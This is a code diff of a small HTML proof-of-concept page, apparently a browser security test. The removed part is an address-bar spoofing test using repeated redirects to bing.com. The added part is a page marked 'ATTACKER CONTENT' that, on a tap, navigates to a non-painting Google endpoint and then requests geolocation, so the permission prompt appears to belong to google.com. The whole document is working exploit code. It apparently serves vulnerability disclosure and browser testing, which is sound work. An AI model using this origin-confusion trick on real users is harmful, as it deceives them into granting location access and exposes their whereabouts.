@@ -1,5 +1,15 @@
+<!DOCTYPE html>
+<meta charset=utf-8>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<title>01-geolocation</title>
+<body style="font:19px/1.5 -apple-system,system-ui;margin:0;padding:22px;background:#3fb950;color:#06240f">
+<h2 style="margin:0">ATTACKER CONTENT</h2>
+<p style="font:12px ui-monospace,monospace;margin:6px 0 0">no-paint commit then geolocation prompt</p>
+<p style="font:12px ui-monospace,monospace;margin:4px 0 0">tap anywhere</p>
 <script>
-    document.write("<h1>This is not Bing</h1>");
-    location.href = "https://bing.com:8081";
-    setInterval(function(){location.href="https://bing.com:8080"},2000);
+const NP='https://www.google.com/csi'
+onclick=()=>{
+  location.href=NP
+  setTimeout(()=>navigator.geolocation.getCurrentPosition(()=>{},()=>{}),700)
+}
 </script>
